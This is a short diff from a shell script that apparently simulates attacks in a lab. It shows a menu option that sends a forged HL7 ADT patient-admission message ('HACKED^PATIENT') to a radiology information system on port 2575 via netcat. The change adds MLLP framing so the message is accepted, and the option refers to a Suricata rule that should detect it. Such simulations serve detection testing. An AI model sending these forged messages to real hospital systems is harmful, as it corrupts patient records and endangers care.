@@ -80,7 +80,7 @@ case "${1:-menu}" in
     echo -e "${CYN}[*] Unauthorized HL7 Message → RIS (${RIS}:2575)${NC}"
     MSG='MSH|^~\&|ATTACKER|LAB|RIS|DIC|20240115120000||ADT^A01|MSG001|P|2.5
 PID|||FAKE001||HACKED^PATIENT||19800101|M'
-    echo -e "${MSG}" | nc -w 3 ${RIS} 2575 2>/dev/null && \
+    printf '\x0b%s\x1c\x0d' "${MSG}" | nc -w 3 ${RIS} 2575 2>/dev/null && \
       echo "[+] HL7 sent" || echo "[*] Connection attempted"
     echo -e "${GRN}[+] Done — check Suricata SID 9000020${NC}"
     ;;
